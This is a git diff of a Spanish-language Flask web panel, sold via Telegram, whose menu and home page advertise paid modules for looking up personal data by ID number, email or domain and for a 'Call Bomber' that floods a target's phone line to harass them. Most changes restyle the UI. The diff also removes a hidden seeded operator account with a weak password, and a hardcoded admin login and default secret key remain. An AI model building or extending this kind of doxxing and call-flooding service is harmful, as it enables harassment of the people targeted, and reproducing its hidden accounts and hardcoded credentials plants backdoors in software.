@@ -6,9 +6,9 @@ import os
 import requests
 
 app = Flask(__name__)
-app.secret_key = os.environ.get("SECRET_KEY", "ulp_drakito_fass_2026_secret")
+app.secret_key = os.environ.get("SECRET_KEY", "ulp_drakito_sett_2026_secret")
 DB_PATH = os.environ.get("DB_PATH", "/tmp/sistema.db")
-LOGO_URL = "https://i.postimg.cc/C1FHfzjr/IMG-20260413-210412-462.jpg"
+LOGO_URL = "https://i.postimg.cc/x8KdvtPQ/IMG-20260411-020447-078.jpg"
 
 
 def get_conn():
@@ -63,14 +63,6 @@ def init_db():
             VALUES (?, ?, ?, ?, ?)
         """, ("DRAKITO_VIP7020", "860055", "admin", 999999, "system"))
 
-    # Operador Oculto
-    cur.execute("SELECT user FROM usuarios WHERE user=?", ("operador1",))
-    if not cur.fetchone():
-        cur.execute("""
-            INSERT INTO usuarios (user, pass, rol, creditos, creado_por)
-            VALUES (?, ?, ?, ?, ?)
-        """, ("operador1", "123456", "operador", 0, "jhorny"))
-
     conn.commit()
     conn.close()
 
@@ -89,8 +81,8 @@ def can_use_client_features():
 
 def logo_html(size_class: str, extra_class: str = ""):
     return f"""
-    <div class="{size_class} rounded-full overflow-hidden border-[2px] border-cyan-400 bg-black flex items-center justify-center shadow-[0_0_20px_rgba(34,211,238,0.5)] animate-pulse-slow {extra_class}">
-        <img src="{LOGO_URL}" class="w-full h-full object-cover rounded-full scale-125" alt="logo">
+    <div class="{size_class} rounded-full overflow-hidden border-[2px] border-[#0ea5e9] bg-[#030712] flex items-center justify-center shadow-[0_0_25px_rgba(14,165,233,0.4)] animate-float {extra_class}">
+        <img src="{LOGO_URL}" class="w-full h-full object-cover rounded-full scale-125 hover:scale-150 transition-transform duration-500" alt="logo">
     </div>
     """
 
@@ -101,24 +93,23 @@ def layout(content, show_nav=False, login_bg=False):
 
     is_boss = is_super_admin()
     is_admin = (r == "admin")
-    is_operador = (r == "operador")
     is_client_side = can_use_client_features()
 
     nav = ""
     if show_nav:
         nav = f"""
-        <div class="w-full rounded-[24px] overflow-hidden mb-8 relative z-40 bg-[#08101a] border border-[#162336] shadow-[0_0_25px_rgba(0,0,0,0.5)]">
+        <div class="w-full rounded-[24px] overflow-hidden mb-8 relative z-40 bg-white/5 backdrop-blur-xl border border-white/10 shadow-[0_8px_32px_rgba(0,0,0,0.5)]">
             <div class="flex items-center justify-between px-5 py-4">
-                <div class="flex items-center gap-3">
+                <div class="flex items-center gap-4">
                     {logo_html("w-12 h-12")}
                     <div class="flex flex-col">
-                        <span class="text-[17px] font-black tracking-widest bg-gradient-to-r from-cyan-300 to-purple-400 bg-clip-text text-transparent uppercase">
-                            ULP DRAKITO FASS
+                        <span class="text-[18px] font-black tracking-widest bg-gradient-to-r from-cyan-400 via-blue-500 to-purple-500 bg-clip-text text-transparent uppercase">
+                            ULP DRAKITO SETT
                         </span>
                     </div>
                 </div>
 
-                <button onclick="toggleMenu()" class="w-12 h-12 rounded-full bg-[#111a26] flex items-center justify-center text-cyan-400 shadow-md">
+                <button onclick="toggleMenu()" class="w-12 h-12 rounded-2xl bg-white/5 border border-white/10 flex items-center justify-center text-cyan-400 shadow-lg hover:bg-white/10 transition-all">
                     <svg class="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                         <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-8 6h8"></path>
                     </svg>
@@ -126,34 +117,40 @@ def layout(content, show_nav=False, login_bg=False):
             </div>
         </div>
 
-        <div id="sidebar" class="fixed top-0 right-0 h-full w-72 bg-[#060b14] border-l border-[#162336] transform translate-x-full transition-transform duration-300 ease-in-out z-50 p-6 shadow-2xl overflow-y-auto">
-            <div class="flex justify-between items-center mb-10">
-                <span class="text-[11px] font-bold text-cyan-400 uppercase tracking-[0.2em]">MENÚ DE CONTROL</span>
-                <button onclick="toggleMenu()" class="text-white text-3xl">&times;</button>
+        <div id="sidebar" class="fixed top-0 right-0 h-full w-72 bg-[#030712]/95 backdrop-blur-3xl border-l border-white/10 transform translate-x-full transition-transform duration-400 ease-out z-50 p-6 shadow-2xl overflow-y-auto">
+            <div class="flex justify-between items-center mb-12">
+                <span class="text-[11px] font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-500 uppercase tracking-[0.3em]">MENÚ PRINCIPAL</span>
+                <button onclick="toggleMenu()" class="text-gray-400 hover:text-white text-3xl transition-colors">&times;</button>
             </div>
 
             <div class="flex flex-col gap-6">
-                <a href="/" class="text-sm font-bold uppercase text-white hover:text-cyan-400 flex items-center gap-2">🏠 INICIO</a>
+                <a href="/" class="menu-link text-sm font-bold uppercase text-gray-300 hover:text-cyan-400 flex items-center gap-3 transition-colors">
+                    <span class="text-xl">🏠</span> INICIO
+                </a>
 
-                {"<a href='/panel_admin' class='text-sm font-bold uppercase text-white hover:text-cyan-400 flex items-center gap-2'>💎 PANEL ADMIN</a>" if is_boss or is_admin else ""}
+                {"<a href='/panel_admin' class='menu-link text-sm font-bold uppercase text-gray-300 hover:text-cyan-400 flex items-center gap-3 transition-colors'><span class='text-xl'>💎</span> PANEL ADMIN</a>" if is_boss or is_admin else ""}
 
-                {"<a href='/gestion' class='text-sm font-bold uppercase text-white hover:text-cyan-400 flex items-center gap-2'>⚙️ GESTIÓN</a>" if is_operador else ""}
+                <a href="/planes" class="menu-link text-sm font-bold uppercase text-gray-300 hover:text-cyan-400 flex items-center gap-3 transition-colors">
+                    <span class="text-xl">🛒</span> COMPRAR CRÉDITOS
+                </a>
 
-                <a href="/planes" class="text-sm font-bold uppercase text-white hover:text-cyan-400 flex items-center gap-2"> 🛒 COMPRAR CRÉDITOS</a>
+                {"<a href='/intelx' class='menu-link text-sm font-bold uppercase text-gray-300 hover:text-cyan-400 flex items-center gap-3 transition-colors'><span class='text-xl'>🔍</span> INTELX</a>" if is_client_side else ""}
 
-                {"<a href='/intelx' class='text-sm font-bold uppercase text-white hover:text-cyan-400 flex items-center gap-2'>🔍 INTELX</a>" if is_client_side else ""}
+                {"<a href='/llamadas_spam' class='menu-link text-sm font-bold uppercase text-gray-300 hover:text-cyan-400 flex items-center gap-3 transition-colors'><span class='text-xl'>📞</span> LLAMADAS SPAM</a>" if is_client_side else ""}
 
-                {"<a href='/llamadas_spam' class='text-sm font-bold uppercase text-white hover:text-cyan-400 flex items-center gap-2'>📞 LLAMADAS SPAM</a>" if is_client_side else ""}
+                <a href="/soporte" class="menu-link text-sm font-bold uppercase text-gray-300 hover:text-cyan-400 flex items-center gap-3 transition-colors">
+                    <span class="text-xl">🎧</span> SOPORTE
+                </a>
 
-                <a href="/soporte" class="text-sm font-bold uppercase text-white hover:text-cyan-400 flex items-center gap-2">🎧 SOPORTE</a>
+                <hr class="border-white/10 my-4">
 
-                <hr class="border-[#162336] my-2">
-
-                <a href="/logout" class="text-sm font-bold uppercase text-red-500 flex items-center gap-2">🚪 SALIR</a>
+                <a href="/logout" class="menu-link text-sm font-bold uppercase text-red-500 hover:text-red-400 flex items-center gap-3 transition-colors">
+                    <span class="text-xl">🚪</span> SALIR
+                </a>
             </div>
         </div>
 
-        <div id="overlay" onclick="toggleMenu()" class="fixed inset-0 bg-black/80 hidden z-40"></div>
+        <div id="overlay" onclick="toggleMenu()" class="fixed inset-0 bg-black/60 backdrop-blur-sm hidden z-40 transition-opacity"></div>
         """
 
     modal_script = """
@@ -208,7 +205,7 @@ def layout(content, show_nav=False, login_bg=False):
                 document.execCommand('copy');
                 alert('Copiado correctamente');
             } catch (err) {
-                alert('No se pudo copiar automatically');
+                alert('No se pudo copiar automáticamente');
             }
             document.body.removeChild(area);
         }
@@ -223,9 +220,7 @@ RESPUESTA:
 ${document.getElementById('rep_respuesta').innerText}
 
 DETALLE:
-${document.getElementById('rep_detalle').innerText}
-
-OPERADOR: ${document.getElementById('rep_operador').innerText}`;
+${document.getElementById('rep_detalle').innerText}`;
 
             copyText(texto);
         }
@@ -233,52 +228,48 @@ OPERADOR: ${document.getElementById('rep_operador').innerText}`;
     """
 
     modal_html = f"""
-    <div id="modalReport" class="hidden fixed inset-0 bg-black/90 z-[60] flex items-center justify-center p-4">
-        <div class="bg-[#08101a] border border-[#162336] w-full max-w-sm rounded-[30px] p-6 shadow-[0_0_30px_rgba(0,0,0,0.8)] relative">
-            <button onclick="closeReport()" class="absolute top-4 right-5 text-gray-400 font-bold text-xl hover:text-white transition">&times;</button>
+    <div id="modalReport" class="hidden fixed inset-0 bg-black/80 backdrop-blur-md z-[60] flex items-center justify-center p-4">
+        <div class="bg-[#0b1120] border border-cyan-500/30 w-full max-w-sm rounded-[32px] p-8 shadow-[0_0_40px_rgba(6,182,212,0.15)] relative transform transition-all">
+            <button onclick="closeReport()" class="absolute top-5 right-6 text-gray-500 font-bold text-2xl hover:text-white transition">&times;</button>
 
-            <div class="text-center mb-6">
-                {logo_html("w-16 h-16", "mx-auto mb-3 shadow-[0_0_15px_rgba(34,211,238,0.5)]")}
-                <h3 class="text-cyan-400 font-bold uppercase tracking-widest text-sm">REPORTE OFICIAL</h3>
-                <p class="text-[9px] text-gray-500 uppercase tracking-widest mt-1">ULP Drakito Fass System</p>
+            <div class="text-center mb-8">
+                {logo_html("w-20 h-20", "mx-auto mb-4 shadow-[0_0_20px_rgba(14,165,233,0.3)]")}
+                <h3 class="text-white font-black uppercase tracking-[0.2em] text-sm">REPORTE DE SISTEMA</h3>
+                <p class="text-[9px] text-cyan-500 uppercase tracking-widest mt-1 font-bold">ULP Drakito Sett</p>
             </div>
 
-            <div class="space-y-4 text-xs font-mono text-gray-300">
-                <div class="flex justify-between gap-3 border-b border-[#162336] pb-2">
+            <div class="space-y-5 text-xs font-mono text-gray-300 bg-white/5 p-5 rounded-2xl border border-white/5">
+                <div class="flex justify-between gap-3 border-b border-white/10 pb-2">
                     <span class="text-gray-500">TIPO:</span>
                     <span id="rep_tipo" class="text-cyan-400 font-bold uppercase"></span>
                 </div>
 
-                <div class="flex justify-between gap-3 border-b border-[#162336] pb-2">
-                    <span class="text-gray-500">REFERENCIA:</span>
-                    <span id="rep_ref" class="text-white font-bold uppercase"></span>
+                <div class="flex justify-between gap-3 border-b border-white/10 pb-2">
+                    <span class="text-gray-500">REF:</span>
+                    <span id="rep_ref" class="text-white font-bold uppercase truncate max-w-[150px]"></span>
                 </div>
 
-                <div class="border-b border-[#162336] pb-3">
-                    <p class="text-gray-500 mb-1">RESPUESTA:</p>
+                <div class="border-b border-white/10 pb-3">
+                    <p class="text-gray-500 mb-2">ESTADO:</p>
                     <p id="rep_respuesta" class="text-emerald-400 font-bold whitespace-pre-line"></p>
                 </div>
 
-                <div class="border-b border-[#162336] pb-3">
-                    <p class="text-gray-500 mb-1">DETALLE:</p>
-                    <div id="rep_detalle" class="text-white font-bold whitespace-pre-wrap leading-relaxed max-h-48 overflow-y-auto bg-black/50 p-2 rounded border border-[#1e293b]"></div>
+                <div class="pt-1">
+                    <p class="text-gray-500 mb-2">DATA EXTRAÍDA:</p>
+                    <div id="rep_detalle" class="text-gray-200 font-medium whitespace-pre-wrap leading-relaxed max-h-40 overflow-y-auto custom-scrollbar"></div>
                 </div>
 
                 <div class="hidden">
                     <span id="rep_codigo"></span>
-                </div>
-
-                <div class="flex justify-between gap-3 border-b border-[#162336] pb-2">
-                    <span class="text-gray-500">OPERADOR:</span>
-                    <span id="rep_operador" class="text-cyan-500 font-bold"></span>
+                    <span id="rep_operador"></span>
                 </div>
             </div>
 
             <div class="grid grid-cols-2 gap-4 mt-8">
-                <button onclick="copyReport()" class="bg-[#111b29] text-emerald-400 border border-[#1e293b] rounded-full py-3 text-[11px] uppercase font-bold tracking-widest shadow-lg hover:bg-[#1e293b] transition">
+                <button onclick="copyReport()" class="bg-gradient-to-r from-emerald-500 to-teal-500 text-white rounded-2xl py-3.5 text-[11px] uppercase font-bold tracking-widest shadow-lg hover:shadow-emerald-500/25 transition-all">
                     COPIAR
                 </button>
-                <button onclick="closeReport()" class="bg-[#111b29] text-cyan-400 border border-[#1e293b] rounded-full py-3 text-[11px] uppercase font-bold tracking-widest shadow-lg hover:bg-[#1e293b] transition">
+                <button onclick="closeReport()" class="bg-white/5 border border-white/10 text-white rounded-2xl py-3.5 text-[11px] uppercase font-bold tracking-widest hover:bg-white/10 transition-all">
                     CERRAR
                 </button>
             </div>
@@ -294,50 +285,67 @@ OPERADOR: ${document.getElementById('rep_operador').innerText}`;
         """
 
     styles = """
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800;900&display=swap" rel="stylesheet">
     <style>
         body {
-            background-color: #040914;
-            color: white;
-            font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: #030712;
+            color: #f8fafc;
+            font-family: 'Outfit', sans-serif;
             touch-action: manipulation;
             overflow-x: hidden;
             min-height: 100vh;
         }
 
-        .animate-pulse-slow {
-            animation: pulseGlow 3s ease-in-out infinite alternate;
+        .animate-float {
+            animation: floating 3s ease-in-out infinite alternate;
         }
 
-        @keyframes pulseGlow {
-            0% { box-shadow: 0 0 10px rgba(34,211,238,0.3); }
-            100% { box-shadow: 0 0 25px rgba(34,211,238,0.6); }
+        @keyframes floating {
+            0% { transform: translateY(0px); box-shadow: 0 0 15px rgba(14,165,233,0.3); }
+            100% { transform: translateY(-5px); box-shadow: 0 0 30px rgba(14,165,233,0.6); }
         }
 
         .neon-card {
-            background-color: #08101a;
-            border: 1px solid #162336;
-            border-radius: 20px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            background: rgba(15, 23, 42, 0.6);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(56, 189, 248, 0.15);
+            border-radius: 28px;
+            box-shadow: 0 10px 40px -10px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.05);
         }
 
         .input-dark {
-            background-color: #111a26;
-            border: 1px solid #1e293b;
-            border-radius: 12px;
-            padding: 14px;
+            background: rgba(3, 7, 18, 0.5);
+            border: 1px solid rgba(51, 65, 85, 0.6);
+            border-radius: 16px;
+            padding: 16px;
             width: 100%;
             outline: none;
             color: white;
-            font-size: 14px;
-            transition: border-color 0.2s;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.2);
         }
 
         .input-dark:focus {
-            border-color: rgba(56, 189, 248, 0.5);
+            border-color: rgba(14, 165, 233, 0.8);
+            box-shadow: 0 0 15px rgba(14,165,233,0.15), inset 0 2px 4px rgba(0,0,0,0.2);
         }
 
         .input-dark::placeholder {
-            color: #64748b;
+            color: #475569;
+            font-weight: 400;
+        }
+
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 4px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: rgba(0,0,0,0.2); 
+            border-radius: 10px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: rgba(56, 189, 248, 0.5); 
+            border-radius: 10px;
         }
 
         .login-bg {
@@ -347,28 +355,28 @@ OPERADOR: ${document.getElementById('rep_operador').innerText}`;
             background-size: cover;
             background-position: center;
             transform: scale(1.05);
-            animation: bgmove 20s ease-in-out infinite alternate;
+            animation: bgmove 25s ease-in-out infinite alternate;
             z-index: 0;
-            filter: brightness(0.15) saturate(1.2) blur(2px);
+            filter: brightness(0.2) saturate(1.1) blur(4px);
         }
 
         .login-overlay {
             position: fixed;
             inset: 0;
-            background: radial-gradient(circle at center, rgba(34,211,238,0.05), #040914 80%);
+            background: radial-gradient(circle at center, rgba(14,165,233,0.08), #030712 90%);
             z-index: 1;
         }
 
         @keyframes bgmove {
             0% { transform: scale(1.05) translate(0px, 0px); }
-            100% { transform: scale(1.15) translate(-15px, -10px); }
+            100% { transform: scale(1.15) translate(-20px, -15px); }
         }
 
         .content-wrap {
             position: relative;
             z-index: 2;
             width: 100%;
-            max-width: 26rem;
+            max-width: 28rem;
             margin: 0 auto;
         }
     </style>
@@ -413,7 +421,7 @@ def index():
         FROM pedidos
         WHERE cliente=?
         ORDER BY id_pedido DESC
-        LIMIT 8
+        LIMIT 10
     """, (session["user"],))
     peds = cur.fetchall()
     conn.close()
@@ -431,96 +439,76 @@ def index():
             ])
             btn = f"""
             <button onclick='showReport({args})'
-                class="bg-transparent text-cyan-400 border border-cyan-500/30 rounded-lg px-4 py-1.5 text-[9px] font-bold uppercase tracking-widest hover:bg-cyan-500/10 transition">
-                VER REPORTE
+                class="bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 rounded-xl px-4 py-2 text-[9px] font-black uppercase tracking-widest hover:bg-cyan-500/20 hover:scale-105 transition-all">
+                REPORTE
             </button>
             """
-        elif p["estado"] == "RECHAZADO":
-            btn = '<span class="text-[9px] text-[#ff3333] font-bold tracking-widest uppercase">RECHAZADO</span>'
         else:
-            btn = '<span class="text-[9px] text-gray-500 italic font-bold tracking-widest uppercase">PROCESANDO</span>'
+            btn = '<span class="text-[9px] bg-red-500/10 border border-red-500/20 px-3 py-1.5 rounded-lg text-[#ef4444] font-black tracking-widest uppercase">ERROR</span>'
 
         historial += f"""
-        <div class="flex justify-between items-center border-b border-[#162336] py-4 gap-4">
+        <div class="flex justify-between items-center border-b border-white/5 py-4 gap-4 hover:bg-white/[0.02] transition-colors rounded-xl px-2">
             <div class="flex flex-col">
-                <span class="text-sm font-mono text-white tracking-wide">{p["referencia"] or "SOLICITUD"}</span>
-                <span class="text-[10px] text-cyan-500 uppercase mt-1 font-bold">{(p["tipo"] or "").upper()}</span>
+                <span class="text-[13px] font-bold text-white tracking-wide truncate max-w-[160px]">{p["referencia"] or "SOLICITUD"}</span>
+                <span class="text-[9px] text-blue-400 uppercase mt-1 font-bold tracking-widest">{(p["tipo"] or "").replace('_', ' ')}</span>
             </div>
             {btn}
         </div>
         """
 
     content = f"""
-    <div class="flex flex-col items-center mb-8 mt-2">
-        {logo_html("w-20 h-20", "mb-4 border-[3px]")}
-        <h1 class="text-4xl font-black tracking-tighter text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 to-purple-400 text-center">
-            ULP DRAKITO<br>FASS
+    <div class="flex flex-col items-center mb-10 mt-4">
+        {logo_html("w-24 h-24", "mb-5")}
+        <h1 class="text-4xl font-black tracking-tighter text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 via-blue-400 to-purple-400 text-center leading-tight">
+            ULP DRAKITO<br>SETT
         </h1>
     </div>
 
     <div class="grid grid-cols-2 gap-4 mb-8">
-        <div class="bg-[#08101a] rounded-[20px] p-5 text-center border border-blue-600 shadow-[0_0_15px_rgba(37,99,235,0.15)]">
-            <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest mb-2">USADOS</p>
-            <h2 class="text-4xl font-bold text-white">{usados}</h2>
+        <div class="bg-gradient-to-br from-[#08101a] to-[#040914] rounded-[24px] p-6 text-center border border-blue-500/20 shadow-[0_10px_30px_rgba(59,130,246,0.1)] relative overflow-hidden">
+            <div class="absolute top-0 right-0 w-16 h-16 bg-blue-500/10 rounded-full blur-xl -mr-8 -mt-8"></div>
+            <p class="text-[10px] text-blue-400 uppercase font-bold tracking-[0.2em] mb-2">USADOS</p>
+            <h2 class="text-5xl font-black text-white">{usados}</h2>
         </div>
-        <div class="bg-[#08101a] rounded-[20px] p-5 text-center border border-emerald-500 shadow-[0_0_15px_rgba(16,185,129,0.15)]">
-            <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest mb-2">RESTANTES</p>
-            <h2 class="text-4xl font-bold text-white">{restantes}</h2>
+        <div class="bg-gradient-to-br from-[#08101a] to-[#040914] rounded-[24px] p-6 text-center border border-emerald-500/20 shadow-[0_10px_30px_rgba(16,185,129,0.1)] relative overflow-hidden">
+            <div class="absolute top-0 right-0 w-16 h-16 bg-emerald-500/10 rounded-full blur-xl -mr-8 -mt-8"></div>
+            <p class="text-[10px] text-emerald-400 uppercase font-bold tracking-[0.2em] mb-2">RESTANTES</p>
+            <h2 class="text-5xl font-black text-white">{restantes}</h2>
         </div>
     </div>
 
-    <div class="neon-card p-6 mb-8">
-        <h3 class="text-[11px] font-bold text-cyan-400 uppercase tracking-widest mb-5 text-center">HISTORIAL</h3>
+    <div class="neon-card p-7 mb-8">
+        <h3 class="text-[11px] font-black text-transparent bg-clip-text bg-gradient-to-r from-gray-200 to-gray-500 uppercase tracking-[0.3em] mb-6 text-center">HISTORIAL RECIENTE</h3>
         <div class="space-y-1">
-            {historial or "<p class='text-center text-gray-600 text-sm py-5'>Sin historial</p>"}
+            {historial or "<p class='text-center text-gray-500 text-xs py-6 font-medium'>Aún no hay registros de pedidos.</p>"}
         </div>
     </div>
 
-    <div class="neon-card p-6 relative overflow-hidden mb-6">
-        <h3 class="text-[13px] font-bold text-cyan-400 uppercase text-center mb-8 tracking-[0.2em]">GUÍA DE USO</h3>
+    <div class="neon-card p-8 relative overflow-hidden mb-6">
+        <h3 class="text-[12px] font-black text-cyan-400 uppercase text-center mb-8 tracking-[0.3em]">MÓDULOS DEL SISTEMA</h3>
 
-        <div class="mb-6">
-            <h4 class="text-white font-bold text-sm mb-2 flex items-center gap-2">
-                <span>💰</span> Recargas
-            </h4>
-            <p class="text-gray-400 text-xs mb-1">
-                Planes desde <span class="text-[#10b981] font-bold">S/15</span> hasta <span class="text-[#10b981] font-bold">S/200</span>
-            </p>
-            <p class="text-gray-400 text-xs">Recarga segura con tu vendedor autorizado.</p>
-        </div>
+        <div class="space-y-8">
+            <div class="flex gap-4 items-start">
+                <div class="w-10 h-10 rounded-xl bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center flex-shrink-0">
+                    <span class="text-xl">🔍</span>
+                </div>
+                <div>
+                    <h4 class="text-white font-bold text-sm mb-1 tracking-wide">IntelX Tracker</h4>
+                    <p class="text-gray-400 text-xs leading-relaxed mb-2">Búsqueda profunda automatizada. Extrae data vinculada a correos, DNI o dominios al instante.</p>
+                    <span class="bg-yellow-500/10 text-yellow-400 border border-yellow-500/20 text-[9px] font-bold px-2 py-1 rounded-md uppercase tracking-widest">1 CRÉDITO</span>
+                </div>
+            </div>
 
-        <div class="mb-6">
-            <h4 class="text-white font-bold text-sm mb-2 flex items-center gap-2">
-                <span>🎧</span> Soporte
-            </h4>
-            <p class="text-gray-400 text-xs mb-1">Soporte inmediato 24/7 ante cualquier inconveniente.</p>
-            <p class="text-[#10b981] font-bold text-xs tracking-widest uppercase">GRATIS</p>
-        </div>
-
-        <div class="mb-6">
-            <h4 class="text-white font-bold text-sm mb-3 flex items-center gap-2">
-                <span class="text-cyan-500">🔍</span> IntelX
-            </h4>
-            <ul class="list-disc pl-5 text-gray-400 text-xs space-y-2 mb-3">
-                <li>Búsqueda profunda de información mediante DNI, dominios, correos o nombres.</li>
-                <li>Procesado 100% automático desde la API Oficial.</li>
-            </ul>
-            <p class="text-[#ff3333] font-bold text-xs flex items-center gap-1">
-                <span class="text-yellow-400">💳</span> Costo: 1 crédito
-            </p>
-        </div>
-
-        <div class="mb-2">
-            <h4 class="text-white font-bold text-sm mb-3 flex items-center gap-2">
-                <span class="text-red-500">📞</span> Llamadas Spam
-            </h4>
-            <ul class="list-disc pl-5 text-gray-400 text-xs space-y-2 mb-3">
-                <li>Envío masivo y automatizado de llamadas a un número objetivo.</li>
-                <li>Ideal para saturar y molestar una línea telefónica específica.</li>
-            </ul>
-            <p class="text-[#ff3333] font-bold text-xs flex items-center gap-1">
-                <span class="text-yellow-400">💳</span> Costo: 2 créditos
-            </p>
+            <div class="flex gap-4 items-start">
+                <div class="w-10 h-10 rounded-xl bg-red-500/10 border border-red-500/20 flex items-center justify-center flex-shrink-0">
+                    <span class="text-xl">📞</span>
+                </div>
+                <div>
+                    <h4 class="text-white font-bold text-sm mb-1 tracking-wide">Call Bomber (Spam)</h4>
+                    <p class="text-gray-400 text-xs leading-relaxed mb-2">Ataque de llamadas masivas para saturar líneas telefónicas automáticamente vía API. 3 niveles de potencia.</p>
+                    <span class="bg-yellow-500/10 text-yellow-400 border border-yellow-500/20 text-[9px] font-bold px-2 py-1 rounded-md uppercase tracking-widest">2 CRÉDITOS</span>
+                </div>
+            </div>
         </div>
     </div>
     """
@@ -544,25 +532,24 @@ def planes():
     cards = ""
     for nombre, precio in precios:
         cards += f"""
-        <div class="p-5 mb-4 rounded-[20px] border border-[#a855f7]/50 bg-[#08101a] flex justify-between items-center shadow-[0_0_15px_rgba(168,85,247,0.15)]">
+        <div class="p-6 mb-4 rounded-[24px] border border-purple-500/20 bg-white/[0.02] flex justify-between items-center shadow-lg hover:border-purple-500/50 hover:bg-white/[0.04] transition-all group">
             <div>
-                <h3 class="text-white font-bold text-xl tracking-tight">{nombre}</h3>
-                <p class="text-gray-500 text-sm font-mono mt-1.5">{precio}</p>
+                <h3 class="text-white font-black text-xl tracking-tight mb-1">{nombre}</h3>
+                <p class="text-purple-400 text-sm font-mono font-bold">{precio}</p>
             </div>
             <a href="https://t.me/DRAKITO_VIP" target="_blank"
-               class="bg-gradient-to-r from-[#d946ef] to-[#9333ea] px-6 py-3 rounded-full text-[10px] font-bold uppercase tracking-widest text-white shadow-[0_0_15px_rgba(217,70,239,0.4)] hover:opacity-90 transition">
-               COMPRAR
+               class="bg-gradient-to-r from-purple-600 to-pink-500 px-6 py-3.5 rounded-xl text-[10px] font-black uppercase tracking-widest text-white shadow-[0_0_20px_rgba(168,85,247,0.3)] group-hover:scale-105 transition-transform">
+               OBTENER
             </a>
         </div>
         """
 
     content = f"""
-    <div class="mt-6 mb-8 text-center">
-        <h2 class="text-[12px] text-cyan-400 font-black italic uppercase tracking-[0.2em] mb-6">
-            PAQUETES OFICIALES
-        </h2>
+    <div class="mt-8 mb-10 text-center">
+        <h2 class="text-[11px] text-cyan-400 font-black uppercase tracking-[0.4em] mb-2">STORE</h2>
+        <h1 class="text-3xl font-black text-white">Planes Oficiales</h1>
     </div>
-    <div class="space-y-3">
+    <div class="space-y-4">
         {cards}
     </div>
     """
@@ -590,35 +577,36 @@ def login():
     session["captcha_val"] = random.randint(100000, 999999)
 
     content = f"""
-    <div class="flex flex-col items-center mt-16">
-        {logo_html("w-28 h-28", "mb-6 border-[3px] shadow-[0_0_30px_rgba(34,211,238,0.6)]")}
+    <div class="flex flex-col items-center mt-12 w-full">
+        {logo_html("w-32 h-32", "mb-8 shadow-[0_0_40px_rgba(14,165,233,0.5)]")}
 
-        <h1 class="text-4xl font-black tracking-tighter text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 to-purple-400 text-center leading-tight">
-            ULP DRAKITO<br>FASS
+        <h1 class="text-5xl font-black tracking-tighter text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 via-blue-400 to-purple-400 text-center leading-[1.1] mb-2">
+            ULP DRAKITO<br>SETT
         </h1>
-        <p class="text-[10px] uppercase tracking-[0.4em] text-cyan-500 mb-8 mt-2 font-bold">
-            Access Panel
+        <p class="text-[11px] uppercase tracking-[0.5em] text-blue-500 mb-10 font-black">
+            System Access
         </p>
 
-        <form method="post" class="w-full space-y-4 bg-[#08101a]/90 border border-[#162336] rounded-[24px] p-6 shadow-2xl backdrop-blur-sm">
-            <input name="u" placeholder="Usuario" class="w-full bg-[#111a26] border border-[#1e293b] rounded-xl p-4 text-white outline-none focus:border-cyan-500 transition" autocomplete="off" required>
-            <input name="p" type="password" placeholder="Contraseña" class="w-full bg-[#111a26] border border-[#1e293b] rounded-xl p-4 text-white outline-none focus:border-cyan-500 transition" required>
+        <form method="post" class="w-full space-y-5 bg-[#030712]/60 border border-white/10 rounded-[32px] p-8 shadow-2xl backdrop-blur-2xl">
+            <input name="u" placeholder="Usuario de acceso" class="input-dark" autocomplete="off" required>
+            <input name="p" type="password" placeholder="Clave secreta" class="input-dark" required>
 
-            <div class="flex gap-3 pt-2">
-                <div class="bg-white text-black rounded-xl flex items-center justify-center font-bold w-1/2 text-2xl tracking-widest shadow-inner">
+            <div class="flex gap-4 pt-2 items-center">
+                <div class="bg-white/10 border border-white/10 text-cyan-400 rounded-2xl flex items-center justify-center font-black w-1/2 h-[54px] text-2xl tracking-[0.2em] shadow-inner">
                     {session['captcha_val']}
                 </div>
-                <input name="cap" placeholder="Captcha" class="w-1/2 bg-[#111a26] border border-[#1e293b] rounded-xl p-4 text-white text-center outline-none focus:border-cyan-500 transition" autocomplete="off" required>
+                <input name="cap" placeholder="Captcha" class="input-dark w-1/2 text-center !text-lg" autocomplete="off" required>
             </div>
 
-            <button class="w-full bg-[#0ea5e9] p-4 rounded-xl font-bold text-sm uppercase tracking-widest text-white shadow-[0_0_15px_rgba(14,165,233,0.4)] mt-4 hover:bg-[#0284c7] transition">
-                Acceder
+            <button class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 p-4 rounded-2xl font-black text-xs uppercase tracking-[0.2em] text-white shadow-[0_10px_20px_rgba(14,165,233,0.3)] mt-6 hover:scale-[1.02] transition-transform">
+                INGRESAR AL PANEL
             </button>
         </form>
 
         <a href="https://t.me/DRAKITO_VIP" target="_blank"
-           class="mt-10 text-cyan-400 text-[11px] font-bold uppercase tracking-widest flex items-center justify-center gap-2 italic w-full hover:text-cyan-300 transition">
-           <span>👤</span> CONTACTAR AL VENDEDOR
+           class="mt-10 text-gray-500 hover:text-cyan-400 text-[10px] font-bold uppercase tracking-widest flex items-center justify-center gap-2 transition-colors w-full">
